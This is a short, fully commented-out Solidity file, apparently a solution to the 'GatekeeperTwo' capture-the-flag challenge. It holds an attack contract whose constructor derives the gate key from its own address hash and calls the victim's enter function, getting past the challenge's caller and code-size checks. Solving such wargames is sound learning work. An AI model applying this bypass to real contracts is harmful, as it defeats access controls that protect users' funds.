// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "./Task.sol";

// contract GatekeeperTwoAttack {

//     GatekeeperTwo public victim;
//     bytes8 public gateKey;


//     constructor(address _victim) {
//         victim = GatekeeperTwo(_victim);

//         uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
//         gateKey = bytes8(_gateKey);
//         victim.enter(gateKey);
//     }
// }